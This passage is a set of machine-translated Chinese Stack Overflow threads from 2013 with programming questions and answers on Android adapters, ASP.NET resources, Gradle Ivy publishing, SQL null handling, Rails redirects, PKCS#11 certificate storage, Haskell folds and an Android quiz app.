发生这种情况时，您的视图是从[适配器](http://developer.android.com/reference/android/widget/Adapter.html)生成的。 为了保留内存并提高性能，适配器将为不同的项目重用相同的视图（例如图像视图）（即项目 1 上的 ImageView 与项目 20 中的 ImageView 是相同的内存对象。因此，适配器将只初始化一次 ImageView 对象，并分别更改项目 1 和 20 的 ts 属性。

现在假设您要在 item 1 的 ImageView 中显示 img1.jpg，在 item 20 的 Image view 中显示 img20.jpg。

您的适配器很可能会触发两者的显示图像，但由于它们共享相同的 ImageView（即只有其中一个在屏幕上可见），因此“ ***checkTaskIsNotActual*** ”将停止 img1.jpg 在项目 20 处显示，因为当项目 20生成后，***ImageView 被复用***

我实际上也有这个问题。因为我的列表中有很多项目，其中大多数取消了显示任务，因为图像视图被重用了。结果这对我来说没问题，但似乎存在内存泄漏，并且当尝试使用太多重用视图时，堆将超出预算。

# asp.net - ASP.NET - 如何重新编译语言资源？

> ID：15879894
> 
> 赞同：1
> 
> 时间：2013-04-08T13:07:33.613
> 
> 标签：asp.net, resources

我注意到，如果我的项目中有另一种语言并更改 HTML 内容文件，它将在我的计算机上运行，​​但如果我上传到服务器，它会保留**旧**的HTML。

如果我修改 .resx 资源文件，即使我没有进行任何更改，它似乎也可以工作，例如只需添加一个空格，然后保存，然后上传。

为什么是这样？我猜测 HTML 缓存在某处，更重要的是如何上传大量更新的翻译，而无需修改每个 .resx 文件？我有很多日语

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T13:20:56.423

但是需要编译 .resx 文件。这就是为什么只有上传不起作用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T13:39:45.493

我刚刚完成了一个将现有网站翻译成多种语言的项目。

我使用带有 c# 代码隐藏的 webforms 做到了这一点。希望我的回答能帮到你...

我使用 RESX 文件来存储不同的语言翻译（例如 index.aspx.fr-CA.resx），并且在后面的 c# 代码中，您必须使用“protect override void InitializeCulture()”方法来让 RESX 文件进入玩。你有这个设置吗？

我发现创建多种语言对我来说很容易——我会生成本地资源（在标记中标记静态内容之后），然后复制生成的 RESX 文件，粘贴并将其重命名为另一种语言。RESX 文件是一个 XML，在 VS 中它创建了一个易于编辑的表格视图来复制和粘贴翻译的语言（或者您可以使用诸如 RESX Manager 之类的工具 - 请参见下面的链接）。为了方便编辑和修改不同语言的语法，我所做的是获取我现有的内容文本并通过 Google 或 Bing 翻译器运行它并将翻译后的文本粘贴到 RESX 文件中......

如果您正在寻找可以自动为您翻译网站然后重新显示在 iframe 中的内容，您可以查看 Bing Translation API [http://www.microsoft.com/web/post/using-the-free-bing- translation-apis](http://www.microsoft.com/web/post/using-the-free-bing-translation-apis) 但在我的情况下，这并不理想，因为翻译不会考虑不同语言的语法，并且在会说并熟悉该语言网站的人告诉您它使您无法进入并进行编辑没有意义！=P

此外，如果您已经有现有的 RESX 文件并且您需要修改一种语言的部分，则此工具非常有用，您可以轻松地在其他语言中进行编辑。 [http://resxmanager.com/](http://resxmanager.com/) 可免费用于非商业用途。它很容易设置，并且绝对可以在您开始时确保您的时间。

# groovy - 发布工件覆盖 Gradle 中的其他工件

> ID：15879900
> 
> 赞同：1
> 
> 时间：2013-04-08T13:07:48.193
> 
> 标签：groovy, gradle, ivy

我正在尝试使用 Gradle 构建几个 jar，而不是维护包含 EJB 的类列表以便我可以单独部署它们，我认为在制作 jar 时扫描类可能会很整洁。

而不是加载类并使用反射来获取注释，我认为使用 asm 扫描类可能更简单，因此在其中一项任务中使用厚实的 ClassReader。

我不认为这是问题，所以可以忽略，基本上我有 2 个任务用于定义 jar 的内容，两者都报告不同的内容通过 eachFile 打印输出进入它们，但是当我查看时文件和关联的 sha1 的发布存储库位置是相同的。

Gradle 坏了，或者更有可能是我做了一些疯狂的事情但看不到它是什么，有人可以帮忙吗？

顺便说一句，如果我禁用任何一个 jar 文件的发布，那么创建的那个是正确的，所以我认为发布有问题而不是震动，但可能是错误的。

```
// ASM is used to interpret the class files, this avoids having to load all classes in the vm and use reflection
import org.objectweb.asm.*
task ejbJar(type: Jar) {
  //outputs.upToDateWhen { false }
  from "${project.buildDir}/classes/main"
  eachFile { println "EJB server: ${name}" }
  include getEjbClassFiles(project.buildDir)
}

task clientEjbJar(type: Jar) {
  //outputs.upToDateWhen { false }
  from "${project.buildDir}/classes/main/com/company/core/versioner"
  eachFile { println "Client EJB ${name}" }  
  include '**/*'
}

artifacts {    
  archives clientEjbJar
  archives ejbJar
}
String[] getEjbClassFiles(base) {
  def includedFiles = []
  def baseDir = project.file("${base}/classes/main")
  def parentPath = baseDir.toPath()
  if (baseDir.isDirectory()) {
    baseDir.eachFileRecurse(groovy.io.FileType.FILES) { file ->
      if(file.name.endsWith('.class')) {
        //get hold of annotations in there --- org.objectweb.asm.Opcodes.ASM4
        def reader = new ClassReader(file.bytes).accept(
          new ClassVisitor(Opcodes.ASM4) {
            public AnnotationVisitor visitAnnotation(String desc, boolean visible) {
              if(desc.equals("Ljavax/ejb/Stateless;") ||
                desc.equals("Ljavax/ejb/Stateful;")) {
                includedFiles += parentPath.relativize(file.toPath())
              }
              return null //no interest in actually visiting the annotation values
            }
          }, 
          ClassReader.SKIP_DEBUG | ClassReader.EXPAND_FRAMES | ClassReader.SKIP_FRAMES | ClassReader.SKIP_CODE
        )
      }
    }
  }
  return includedFiles
}    

publishing {
  publications {
    mypub(IvyPublication) {
      artifact(ejbJar) {
        name 'ejb' 
      }
      artifact(clientEjbJar) { 
        name 'client-ejb' 
      }
    }
  }
  repositories {
    ivy {
      name 'personal'
      url "${ant['developer.repository']}/"
      layout 'pattern', {
        artifact "[organisation]/[module]/[artifact]/[revision]/[type]/[artifact]-[revision].[ext]"
    ivy "[organisation]/[module]/[type]/[revision]/[type]/[type]-[revision].[ext]"
      }
    }   
  }  
} 
```

我确实把它分解成一个更简单的形式，因为我认为它可能是一个 Gradle 错误。

简化的形式是：

```
apply plugin: 'java'
apply plugin: 'ivy-publish'

task bigJar(type: Jar) {
  from "${rootDir}/src/main/resources"
  include '**/*'
}

task smallJar(type: Jar) {
  from "${rootDir}/src/main/resources/A/B"
  include '**/*'
}

group 'ICantBeEmpty'
artifacts {
  archives bigJar
  archives smallJar
}

publishing {
  publications {
    mypub(IvyPublication) {
      artifact(bigJar) { name 'biggie' }
      artifact(smallJar) { name 'smallie' }
    }
    repositories {
  ivy {
    name 'personal'
    url "c:/temp/gradletest"
    layout 'pattern', {
      artifact "[organisation]/[module]/[artifact]/[revision]/[type]/[artifact]-[revision].[ext]"
      ivy "[organisation]/[module]/[type]/[revision]/[type]/[type]-[revision].[ext]"
    }
      }
    }
  }
} 
```

这会在 c:/temp/gradletest/ICantBeEmpty/report-bug/biggie/unspecified/biggie-unspecified.jar 和 c:/temp/gradletest/ICantBeEmpty/report-bug/smallie/unspecified/smallie-unspecified 中生成 2 个文件。 jar 这两个文件都是相同的，但是我想我知道为什么要看到我以后的答案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-08T11:19:28.147

在查看一些配置时，我注意到一些奇怪的行为导致我解决了这个问题，这是一个 Gradle 错误。

在我的构建中，我有一个从头开始的任务

```
configurations.archives.artifacts.each { println it } 
```

这给了我 5 条不同的线路输出，但是将其更改为

```
configurations.archives.artifacts.each { println it.file } 
```

产生相同的文件名 5 次。

事实证明这与我的问题有关，尽管工件作为单独的实体存在，用于唯一标识它们的名称是相同的，因此在发布期间始终选择相同的文件。在 java 插件中，工件的名称默认由 ${baseName}-${appendix}-${version}-${classifier}.${extension} 给出。这意味着如果未指定附录或分类器，则工件将具有相同的名称。

我通过添加附录名称使用上面的示例代码对此进行了测试

```
task bigJar(type: Jar) {
  appendix = 'big'
  from "${rootDir}/src/main/resources"
  include '**/*'
}

task smallJar(type: Jar) {
  appendix = 'small'
  from "${rootDir}/src/main/resources/A/B"
  include '**/*'
} 
```

使用这个而不是问题中的代码会产生 2 个不同的罐子。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T16:06:52.733

这不是一个完整的答案，但足够好的解决方法，如果我添加一个新的发布定义，我可以将我想要的工件发布到我想要的位置，唯一的缺点是它会创建另一个 gradle 任务理想。

```
 publications {
      mypub(IvyPublication) {
        artifact(ejbJar) {
          name 'ejb' 
        }
      }
      newpub(IvyPublication) {
        artifact(clientEjbJar) { 
          name 'client-ejb' 
        }
      }
    } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-29T14:44:59.867

上述答案在短期内有效，但确实揭示了 Gradle 世界中的另一个短板在[此处输入链接描述](https://stackoverflow.com/questions/16281512/ivy-module-xml-doesnt-contain-all-artifacts-when-gradle-publish-is-used)

不确定 Gradle 是否是目前的全部，到目前为止还没有人回答我的问题，所以也许它没有那么积极地开发！

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-29T17:42:54.480

我不是 Gradle 这部分的专家，但是您正在使用的功能被标记为“[孵化](http://www.gradle.org/docs/current/userguide/publishing_ivy.html)”；您正在使用可能不完整的新发布功能。也许您应该使用[旧](http://www.gradle.org/docs/current/userguide/artifact_management.html)的做事方式。您似乎也通过使用`artifacts`闭包来混合两种方式。

# c# - Windows Phone 中的导航源

> ID：15879904
> 
> 赞同：2
> 
> 时间：2013-04-08T13:07:56.630
> 
> 标签：c#, .net, navigation, windows-phone-8

我的申请中有 2 页，A 和 B。

如果我从应用程序外部导航到 A，我想显示一个消息框。如果我从 B 导航到 A，我不想显示任何内容。

有没有办法在 A 中识别启动导航的页面？即在 A.Loaded （或任何其他事件）中，我需要类似的东西

```
if(pageFromWhichIAmComingFrom == B) 
```

OnNavigatedTo、OnNavigationFrom 和 OnNavigatedFrom 似乎对我没有帮助。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-08T13:28:34.970

您可以使用[**PhoneApplicationService**](http://msdn.microsoft.com/en-us/library/windowsphone/develop/microsoft.phone.shell.phoneapplicationservice)类来存储有关您上次访问的页面的信息。例如，`OnNavigatedFrom`在页面 A 上使用：

```
void OnNavigatedFrom(object sender, Eventargs e)
{
   PhoneApplicationService.Current.State["LastPage"] = "PageA";
} 
```

然后在下一页检查：

```
void OnNavigatedTo(object sender, Eventargs e)
{
   if(PhoneApplicationService.Current.State["LastPage"].ToString() == "PageA")
   {
      // came from page A
   }
   else 
   {
       // came from a different page
   }
} 
```

希望这可以帮助！

**更新：**

我刚刚看到的另一件可能值得尝试的事情是使用该`NavigationService.BackStack`属性。我还没有尝试过，但它似乎应该可以工作。在您的`OnNavigatedTo`事件处理程序中，您应该能够从堆栈中获取最后一个条目以查看您的最后一页。这会更简单，并且不需要您手动设置任何属性。例子：

```
protected override void OnNavigatedTo(System.Windows.Navigation.NavigationEventArgs e)
{
    base.OnNavigatedTo(e);

    var lastPage = NavigationService.BackStack.FirstOrDefault();
} 
```

[**在这里**](https://stackoverflow.com/questions/6999028/can-i-find-out-which-page-a-user-came-from-on-back-button-press-on-wp7)找到。

# jquery - 具有负值和正值的 JQuery if 语句

> ID：15879905
> 
> 赞同：0
> 
> 时间：2013-04-08T13:07:58.597
> 
> 标签：jquery, if-statement, numbers

我在一个函数中有两个变量：$x= -660px 并且是固定的，$y 每次调用函数时都会减少 20px。$y = 220px 第一次调用该函数。
在函数中，我得到了一个 if else 语句

```
 if($y > $x){
    //do something
    }else{
    //do nothing
    } 
```

我想要得到的是 $y 只要大于 -660px 就减少然后停止。

它工作正常，直到 $y = -20px。IE。if 语句'做某事'直到 $y = -20px 然后它停止但不执行'else'语句。

我不知道它有什么问题。这是正确的还是我的问题可能来自其他地方？

* * *

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-08T13:15:08.490

不应该是`if($y < $x)`因为它们是负值吗？

这有效：

```
$(function(){
    var x=0,y=-660;
    var inter = setInterval(function(){
        if(y < x)
            subtract();
        else
            clearInterval(inter);
    },200);
    function subtract(){
        x = x-20;
        $('body').append('<br />x='+x+' y='+y);
    }
}); 
```

[演示](http://jsfiddle.net/x3sDw/)

使用 px 值：

```
$(function(){
    var x="0px",y="-660px";
    var inter = setInterval(function(){
        if(parseInt(y) < parseInt(x))
            subtract();
        else
            clearInterval(inter);
    },200);
    function subtract(){
        x = (parseInt(x)-20)+"px";
        $('body').append('<br />x='+x+' y='+y);
    }
}); 
```

[演示](http://jsfiddle.net/x3sDw/1/)

# javascript - requirejs 连续多次需要

> ID：15879907
> 
> 赞同：1
> 
> 时间：2013-04-08T13:08:04.760
> 
> 标签：javascript, optimization, requirejs, require, requirejs-define

我写了一个 JavaScript 模块加载器，它在一个循环中定义了不同的模块。

```
function(moduleList) {
    var arr = [];
    for (i = 0, l = moduleList.length; i < l; i++) {
        var m = moduleList[i];

        define(m.guid, function() {
            return  {
                container : m.container,
                configuration : m.configuration,
                moduleId : m.id
            }
        });
        arr[i] = m;
    }
} 
```

紧随其后的是下一个 for 循环，我在其中“需要”先前定义的模块..

```
for (i = 0, l = arr.length; i < l; i++) {   
   require([arr[i].id,arr[i].guid], function(module, moduleConfiguration) {
        core.utils.log("m.id: " + moduleConfiguration.moduleId);
        core.utils.log("init " + moduleConfiguration.moduleId, moduleConfiguration);

        module.init(moduleConfiguration);
    });
} 
```

现在的问题是，在每个“require”块中，moduleConfiguration 和模块都是相同的。要进行“require”调用，它使用不同的 id，但结果总是相同的。

有人知道如何解决这个问题吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T13:14:08.987

我认为您的定义函数应该如下所示，以便“m”的范围正确：

```
function(moduleList) {
    var arr = [], i; // declare i!!!!
    function def(m) {
        define(m.guid, function() {
            return  {
                container : m.container,
                configuration : m.configuration,
                moduleId : m.id
            }
        });
    }

    for (i = 0, l = moduleList.length; i < l; i++) {

        var m = moduleList[i];

        def(m);
        arr[i] = m;
    }
 } 
```

在您的代码中，所有这些模块回调共享相同的变量“m”。通过引入另一个函数（和另一个作用域），您可以确保每个回调都有自己的副本。

# python - 从 Django 模板访问 Model.objects 方法

> ID：15879911
> 
> 赞同：2
> 
> 时间：2013-04-08T13:08:24.320
> 
> 标签：python, django, templates

假设我有一个“人”模型。
如何在模板中显示系统中的人数？
在标准代码中，我会这样做：`Person.objects.count()`.
但是如何在模板中做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T13:12:01.140

您将 的输出保存`Person.objects.count()`在一个变量中，并将其从相应的视图传递给您的模板。

# performance - 网络随机爆炸所花费的时间 - （网站速度）

> ID：15879915
> 
> 赞同：1
> 
> 时间：2013-04-08T13:08:39.867
> 
> 标签：performance, networking, amazon-ec2, pagespeed, newrelic

我们是在都柏林由亚马逊托管的 PHP 网络应用程序。最近我们遇到了一个非常奇怪的问题。

**问题：**

**突然之间，我们的网站变得异常缓慢，有时甚至无法使用。**这通常会持续几分钟，然后一切都恢复正常。**这似乎是随机发生的**。有时一天会发生好几次，然后我们在几天内不会出现这个问题。**我们使用New Relic**跟踪我们的网站速度。在监控中我发现**“在网络上花费的时间”似乎突然爆炸了**（定义在这里：[https ://newrelic.com/docs/features/how-does-real-user-monitoring-work#what-是否包含网络时间](https://newrelic.com/docs/features/how-does-real-user-monitoring-work#what-does-the-network-time-include)）。每个请求通常约为 0.5 秒。这个值会爆发到 9-15 秒之间的任何地方。大约 10-15 分钟后，它又回到 0.5 秒。

**我可以排除的原因：**

*   没有导致这种情况的流量峰值（它也发生在正常负载期间）+我们有足够的 CPU 和数据库能力，因此小峰值不应该造成问题。

*   没有运行任何导致问题的昂贵的内部脚本。

*   它似乎与外部软件无响应无关（即使是没有实现第三方组件的单个页面也非常慢（它们甚至没有谷歌分析）。

**我认为它可能是：**

*   老实说，我有点迷路了。
*   我唯一能想象的是，应用程序和数据库之间花费的时间非常高，原因不明，例如因为它们在不同的亚马逊可用区有一段时间或类似的东西，但这种问题应该然后偶尔影响每个人，我真的不知道如何解决或检测到这个。
*   我已联系亚马逊，但仍在等待答复。

您是否有类似的问题或任何想法可能是导致此问题的原因？

非常感谢任何提示。

# sql - sql 合并可能有空值的两列

> ID：15879918
> 
> 赞同：2
> 
> 时间：2013-04-08T13:08:48.033
> 
> 标签：sql, sql-server, null

这应该是一件容易的事，但我似乎不断获得额外的空间。基本上我想做的是将多列合并为一列。但是这些列中的每一列也可能为空。当我组合它们时，我还希望它们用空格（''）分隔。

我创建的是以下查询：

```
select 'All'= ISNULL(Name+' ','')+ISNULL(City+' ','')+ISNULL(CAST(Age as varchar(50))+' ','')  from zPerson 
```

结果是：

```
All
John Rock Hill 23 
 Munchen 29 
Julie London 35 
 Fort Mill 27 
Bob  29 
```

如您所见：名称为空时有一个额外的空格。我不想要那个。

初始表是：

```
id  Name    City            Age InStates    AllCombined
1   John    Rock Hill       23  1              NULL
2           Munchen         29  0              NULL
3   Julie   London          35  0              NULL
4           Fort Mill       27  1              NULL
5   Bob                     29  1              NULL 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-08T13:14:45.573

```
select 'All'= LTRIM(ISNULL(Name+' ','')+ISNULL(City+' ','')+ISNULL(CAST(Age as varchar(50))+' ','')  from zPerson) 
```

[见 LTRIM()](http://msdn.microsoft.com/en-IN/library/ms177827%28v=sql.90%29.aspx)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-08T13:14:54.083

在您发布的数据中，该`Name`列不包含 NULL。相反，它包含空字符串，因此`ISNULL(Name+' ','')`将评估为单个空格。

最简单的解决方案是更改数据以使空字符串为空。这在您的情况下是合适的，因为这显然是您的意图。

```
UPDATE zPerson SET Name=NULL WHERE Name='' 
```

如有必要，对您的`City`和字段重复此操作。`Age`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-08T13:13:43.863

在 ISNULL() 函数周围使用[TRIM()](http://msdn.microsoft.com/en-us/library/ms181984.aspx) ，或在整个选定术语周围使用[LTRIM()](http://msdn.microsoft.com/en-us/library/ms177827.aspx)

# ruby-on-rails - 在 Rails 中的相同操作中 Redirect_to 并返回两次？

> ID：15879931
> 
> 赞同：1
> 
> 时间：2013-04-08T13:09:33.163
> 
> 标签：ruby-on-rails, redirect

我有以下代码：

```
def edit
    @post = Post.find(params[:id])
    if !current_user.posts.include?(@post)
      permission_denied
    end
    respond_to do |format|
      format.html  # edit.html.erb
      format.json  { render :json => @post }
    end
end

 def permission_denied
    flash[:notice] = 'Sorry, you are not authorized to access that page.'
    redirect_to root_url
 end 
```

如何调整此代码，因此它不会显示“在此操作中多次调用渲染和/或重定向”。我尝试将“并返回”添加到`redirect_to root_url and return`，但我不断收到相同的错误。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T13:13:27.703

您应该从编辑操作返回：

```
def edit
  @post = Post.find(params[:id])
  return permission_denied if !current_user.posts.include?(@post)

  respond_to do |format|
    format.html  # edit.html.erb
    format.json  { render :json => @post }
  end
end 
```

# rsa - 在 pkcs11 密钥库中存储证书

> ID：15879938
> 
> 赞同：2
> 
> 时间：2013-04-08T13:10:01.393
> 
> 标签：rsa, smartcard, private-key, pkcs#11, key-pair

我在 pkcs11 密钥库中生成一个 RSA 密钥对，它存储到智能卡中，我正在生成 pkcs10 请求。当我下载等效证书时，我如何将其存储到智能卡中（没有私钥，因为密钥已经存储在智能卡中），因为我无法访问 pkcs11 密钥库中的私钥。

```
 String wdtokenpath = "path to dll file";
    String pkcs11ConfigSettings = "name = SmartCard\n" + "library =" + wdtokenpath;
    byte[] pkcs11ConfigBytes = pkcs11ConfigSettings.getBytes();
    ByteArrayInputStream confStream = new ByteArrayInputStream(pkcs11ConfigBytes);
    Provider pkcs11Provider = null;

    Class sunPkcs11Class = Class.forName("sun.security.pkcs11.SunPKCS11");
    Constructor pkcs11Constr = sunPkcs11Class.getConstructor(
            java.io.InputStream.class);
    pkcs11Provider = (Provider) pkcs11Constr.newInstance(confStream);
    CallbackHandler call = new TextCallbackHandler();
    Subject token = new Subject();
    AuthProvider aprov = (AuthProvider) pkcs11Provider;
    aprov.login(token, call);

    System.out.println("Login successfully");
    KeyPairGenerator keyGen1 = KeyPairGenerator.getInstance("RSA", aprov);
    keyGen1.initialize(2048);
    KeyPair pair1 = keyGen1.generateKeyPair();
    PublicKey publicKey1 = pair1.getPublic();

    String sigAlg = "SHA1withRSA";
    PKCS10 pkcs10 = new PKCS10(publicKey1);
    Signature signature = Signature.getInstance("SHA1withRSA", pkcs11Provider);
    signature.initSign(pair1.getPrivate()); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2018-02-07T08:49:01.287

这取决于您拥有哪种智能卡，或者您拥有哪种 PKCS#11 设备。实施可能会有所不同。

当你使用`SunPKCS11`时，你可以这样做：

```
public boolean uploadCertificate(X509Certificate cert, String label, String id) {
        CK_ATTRIBUTE[] certificate = new CK_ATTRIBUTE[9];

        certificate[0] = new CK_ATTRIBUTE(PKCS11Constants.CKA_CLASS, PKCS11Constants.CKO_CERTIFICATE);
        certificate[1] = new CK_ATTRIBUTE(PKCS11Constants.CKA_TOKEN, true);
        certificate[2] = new CK_ATTRIBUTE(PKCS11Constants.CKA_PRIVATE, false);
        certificate[3] = new CK_ATTRIBUTE(PKCS11Constants.CKA_LABEL, label.toCharArray());
        certificate[4] = new CK_ATTRIBUTE(PKCS11Constants.CKA_SUBJECT, cert.getSubjectX500Principal().getEncoded());
        certificate[5] = new CK_ATTRIBUTE(PKCS11Constants.CKA_ID, HexUtils.hexStringToByteArray(id));
        certificate[6] = new CK_ATTRIBUTE(PKCS11Constants.CKA_ISSUER, cert.getIssuerX500Principal().getEncoded());
        certificate[7] = new CK_ATTRIBUTE(PKCS11Constants.CKA_SERIAL_NUMBER, cert.getSerialNumber().toByteArray());

        try {
            certificate[8] = new CK_ATTRIBUTE(PKCS11Constants.CKA_VALUE, cert.getEncoded());
            p11.C_CreateObject(hSession, certificate);
        } catch (Exception e) {
            logger.log(Level.SEVERE, "Upload Certificate Exception", e);
            return false;
        }

        return true;
    } 
```

或者使用 IAIK PKCS#11 Wrapper：

```
// create certificate object template
        X509PublicKeyCertificate pkcs11X509PublicKeyCertificate = new X509PublicKeyCertificate();

        pkcs11X509PublicKeyCertificate.getToken().setBooleanValue(Boolean.TRUE);
        pkcs11X509PublicKeyCertificate.getPrivate().setBooleanValue(Boolean.FALSE);
        pkcs11X509PublicKeyCertificate.getLabel().setCharArrayValue("test".toCharArray());
        pkcs11X509PublicKeyCertificate.getSubject().setByteArrayValue(cert.getSubjectX500Principal().getEncoded());
        pkcs11X509PublicKeyCertificate.getId().setByteArrayValue(objectId);
        pkcs11X509PublicKeyCertificate.getIssuer().setByteArrayValue(cert.getIssuerX500Principal().getEncoded());
        // serial number should be an DER encoded ASN.1 integer
        /*
         INTEGER asn1Integer = new INTEGER(userCertificate.getSerialNumber());
         ByteArrayOutputStream buffer = new ByteArrayOutputStream();
         DerCoder.encodeTo(asn1Integer, buffer);
         pkcs11X509PublicKeyCertificate.getSerialNumber().setByteArrayValue(buffer.toByteArray());
         */
        // Netscape deviates from the standard here, for use with Netscape rather use
        pkcs11X509PublicKeyCertificate.getSerialNumber().setByteArrayValue(cert.getSerialNumber().toByteArray());
        pkcs11X509PublicKeyCertificate.getValue().setByteArrayValue(cert.getEncoded());

        session.createObject(pkcs11X509PublicKeyCertificate); 
```

证书对象的 ID 应该与生成的密钥的 ID 相同。

# haskell - 使用 foldr 实现 take

> ID：15879940
> 
> 赞同：7
> 
> 时间：2013-04-08T13:10:10.520
> 
> 标签：haskell, fold, take

这是我`take`使用的版本`foldr`：

```
myTake n list = foldr step [] list
                where step x y | (length y) < n = x : y
                               | otherwise = y

main = do print $ myTake 2 [1,2,3,4] 
```

输出不是我所期望的：

```
[3,4] 
```

然后我尝试通过将长度`y`插入自身来进行调试，结果是：

```
[3,2,1,0] 
```

我不明白为什么长度按降序插入。也许我错过了一些明显的东西？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-04-08T13:59:08.767

如果你想实现`take`using`foldr`你需要模拟从左到右遍历列表。关键是使折叠函数依赖于一个额外的参数，该参数编码你想要的逻辑，而不仅仅是依赖于列表的折叠尾部。

```
take :: Int -> [a] -> [a]
take n xs = foldr step (const []) xs n
  where
    step x g 0 = []
    step x g n = x:g (n-1) 
```

在这里，`foldr`返回一个函数，该函数接受一个数字参数并从左到右遍历列表，从中获取所需的数量。由于懒惰，这也适用于无限列表。一旦额外的参数达到零，`foldr`就会短路并返回一个空列表。

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2013-04-08T13:20:03.533

![<code>foldr</code> 的可视化](https://i.stack.imgur.com/bV7Cx.png)

`foldr``step`将从*最后一个元素**开始应用函数。那是，

```
foldr step [] [1,2,3,4] == 1 `step` (2 `step` (3 `step` (4 `step` [])))
                        == 1 `step` (2 `step` (3 `step` (4:[])))
                        == 1 `step` (2 `step (3:4:[]))   -- length y == 2 here
                        == 1 `step` (3:4:[])
                        == 3:4:[]
                        == [3, 4] 
```

长度按降序“插入”，因为`:`是*前置*操作。较长的长度被添加到列表的开头。

[（图片取自[http://en.wikipedia.org/wiki/Fold_%28higher-order_function%29](http://en.wikipedia.org/wiki/Fold_%28higher-order_function%29)）]

*：为简单起见，我们假设每个操作都是严格的，这在 OP 的`step`实现中是正确的。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2013-04-08T17:18:57.813

到目前为止，其他答案让它变得过于复杂，因为它们似乎过于拘泥于`foldr`“从右到左”起作用的概念。从某种意义上说，它确实如此，但 Haskell 是一种惰性语言，因此使用惰性折叠步骤的“从右到左”计算实际上会从左到右执行，因为结果会被消耗掉。

研究这段代码：

```
take :: Int -> [a] -> [a]
take n xs = foldr step [] (tagFrom 1 xs)
    where step (a, i) rest
               | i > n     = []
               | otherwise = a:rest

tagFrom :: Enum i => i -> [a] -> [(a, i)]
tagFrom i xs = zip xs [i..] 
```

# java - 弹出关闭后如何保存积分并避免SQLite重复？

> ID：15879945
> 
> 赞同：0
> 
> 时间：2013-04-08T13:10:15.543
> 
> 标签：java, android

我有 36 个 imageButtons，每一个都调用同一个弹出窗口，在其中我从 sqlite 数据库中设置随机问题。当用户通过单击 4 个可能的解决方案之一来回答问题时，它会关闭并返回到我的 36 个按钮。现在我有两个问题：

1.  我使用此代码来避免重复问题。在活动范围内：

    LinkedList mAnsweredQuestions = new LinkedList();

    ```
    private String generateWhereClause(){
        StringBuilder result = new StringBuilder();
        for (Long l : mAnsweredQuestions){
            result.append(" AND _ID <> " + l);
        }
        return result.toString();
    } 
    ```

    在我的问题方法中：

    mAnsweredQuestions.add(c.getLong(0));

但是，当弹出问题关闭后我的活动恢复时，这不起作用。就像它从头开始加载我的活动一样。我在我的其他游戏中使用它，它在“正常”活动中运行良好，但由于某种原因在弹出后它没有。

2.我需要为每个 imageButton 按下来启动这个弹出活动，并在每个正确答案之后保存不同数量的点。我在其他游戏中使用 startActivityForResult 来启动活动并保存结果，但在这种情况下，我使用每个按钮开始不同的活动。现在我必须开始相同的活动，并保存不同的结果。我怎样才能做到这一点？这是我的弹出问题类：

```
public class Pitanja_Cigle extends Activity{

    public static String tacanOdg;
    int counter = 0;

    Button b1, b2, b3, b4;
    TextView question;

LinkedList<Long> mAnsweredQuestions = new LinkedList<Long>();

    private String generateWhereClause(){
        StringBuilder result = new StringBuilder();
        for (Long l : mAnsweredQuestions){
            result.append(" AND _ID <> " + l);
        }
        return result.toString();
    }

    Runnable mLaunchTaskFinish = new Runnable() {
        public void run() {
            finish();
        }
     };

    private class Answer {
        public Answer(String opt, boolean correct) {
            option = opt;
            isCorrect = correct;
        }

        String option;
        boolean isCorrect;
    }
    Handler mHandler = new Handler();

    final OnClickListener clickListener = new OnClickListener() {
        public void onClick(View v) {
            Answer ans = (Answer) v.getTag();
            if (ans.isCorrect) {
                Intent i = new Intent("rs.androidaplikacije.toplo_hladno.TACANODGOVOR");
                startActivity(i);
                mHandler.postDelayed(mLaunchTaskFinish,1200);
            }
            else{   
                Intent i = new Intent(getApplicationContext(), PogresanOdgovor.class);
                i.putExtra("tacanOdgovor", tacanOdg);
                startActivity(i);
                mHandler.postDelayed(mLaunchTaskFinish,2200);
            }
        }
     };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        requestWindowFeature(Window.FEATURE_NO_TITLE);   //full screen
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);

        setContentView(R.layout.pitanja_cigle);

        InicirajVariable();

        nextQuestion();
    }

    private void nextQuestion() {
        counter++;

        TestAdapter mDbHelper = new TestAdapter(this);
        mDbHelper.createDatabase();

        try{    //Pokusava da otvori db

            mDbHelper.open();  //baza otvorena

            Cursor c = mDbHelper.getPitanjaCigle(generateWhereClause());

            mAnsweredQuestions.add(c.getLong(0));

            List<Answer> labels = new ArrayList<Answer>();

            labels.add(new Answer(c.getString(2), true));
            labels.add(new Answer(c.getString(3), false));
            labels.add(new Answer(c.getString(4), false));
            labels.add(new Answer(c.getString(5), false));

            tacanOdg = c.getString(2);

            Collections.shuffle(labels);

            question.setText(c.getString(1));

            b1.setText(labels.get(0).option);
            b1.setTag(labels.get(0));
            b1.setOnClickListener(clickListener);

            b2.setText(labels.get(1).option);
            b2.setTag(labels.get(1));
            b2.setOnClickListener(clickListener);

            b3.setText(labels.get(2).option);
            b3.setTag(labels.get(2));
            b3.setOnClickListener(clickListener);

            b4.setText(labels.get(3).option);
            b4.setTag(labels.get(3));
            b4.setOnClickListener(clickListener);

    }

    finally{    // kada zavrsi sa koriscenjem baze podataka, zatvara db
        mDbHelper.close();
    }
    }

    private void InicirajVariable() {
        Typeface naslov = Typeface.createFromAsset(getAssets(), "Lobster.ttf");
        Typeface dugmad = Typeface.createFromAsset(getAssets(), "Bebas.ttf");
